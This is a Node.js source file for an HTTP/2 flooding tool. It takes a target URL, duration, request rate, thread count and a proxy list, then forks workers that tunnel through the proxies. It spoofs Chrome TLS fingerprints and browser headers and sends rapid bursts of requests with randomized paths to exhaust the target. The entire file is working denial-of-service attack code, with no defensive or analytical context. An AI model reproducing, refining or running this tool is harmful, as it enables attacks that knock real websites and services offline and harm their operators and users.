// Optimized version with static headers and :path patching

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");

const cplist = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
  "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
  "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
];

const cipper = cplist[Math.floor(Math.random() * cplist.length)];
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256"];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE ;

if (process.argv.length < 7) {
  console.log(`Usage: host time req thread proxy.txt`);
  process.exit();
}

const secureProtocol = ["TLSv1_2_method", "TLSv1_3_method"];

const secureContextOptions = {
  ciphers: ciphers,
  sigalgs: SignalsList,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"; 

const baseHeaders = {
    ":method": "GET",
    ":authority": parsedTarget.host,
    ":scheme": "https",
    "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9"
};

const proxyOptionsTemplate = {
  address: parsedTarget.host + ":443",
  timeout: 10
};

const h2Settings = {
    headerTableSize: 65536,
    maxConcurrentStreams: 1000,
    initialWindowSize: 6291456,
    maxHeaderListSize: 32768,
    maxFrameSize: 16384,
    enablePush: false,
};

const streamSettings = {
    parent: 0,
    exclusive: true,
    weight: 220,
};

const tlsOptionsTemplate = (connection) => ({
    port: parsedPort,
    secure: true,
    ALPNProtocols: ["h2", "http/1.1"],
    ciphers: cipper,
    sigalgs: sigalgs,
    requestCert: true,
    socket: connection,
    ecdhCurve: ecdhCurve,
    honorCipherOrder: false,
    rejectUnauthorized: false,
    secureOptions: secureOptions,
    secureContext: secureContext,
    host: parsedTarget.host,
    servername: parsedTarget.host,
    secureProtocol: secureProtocol
});

if (cluster.isMaster) {
  console.clear()
  console.log(`attack sent`.brightBlue)
  console.log(`--------------------------------------------`.gray)
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder)
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = Buffer.from(payload);
    const connection = net.connect({ host: options.host, port: options.port });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    connection.on("connect", () => connection.write(buffer));

    connection.on("data", chunk => {
      if (chunk.toString("utf-8").includes("HTTP/1.1 200"))
        return callback(connection, undefined);
      connection.destroy();
      return callback(undefined, "error: invalid response from proxy");
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout");
    });
  }
}

const Socker = new NetSocket();

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function generateRandomString(min, max) {
    const length = Math.floor(Math.random() * (max - min + 1)) + min;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let out = "";
    for (let i = 0; i < length; i++) out += chars[Math.floor(Math.random() * chars.length)];
    return out;
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");

  const proxyOptions = {
    ...proxyOptionsTemplate,
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
  };
  
  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);
    
    const tlsOptions = tlsOptionsTemplate(connection);
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      createConnection: () => tlsConn,
      settings: h2Settings,
    });

    client.setMaxListeners(0);

    const headers = { ...baseHeaders,":path":"" };

    client.on("connect", () => {
      const interval = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          headers[":path"] = parsedTarget.path + "?q=" + generateRandomString(10, 25);

          const req = client.request(headers, streamSettings);
          req.on("response", () => {
            req.close();
            req.destroy();
          });
          req.end();
        }
      }, 300);

      client.on("close", () => { clearInterval(interval); client.destroy(); tlsConn.destroy(); connection.destroy(); });
      client.on("error", () => { clearInterval(interval); client.destroy(); tlsConn.destroy(); connection.destroy(); });
      client.on("timeout", () => { clearInterval(interval); client.destroy(); tlsConn.destroy(); connection.destroy(); });
    });
  });
}

setTimeout(() => process.exit(1), args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
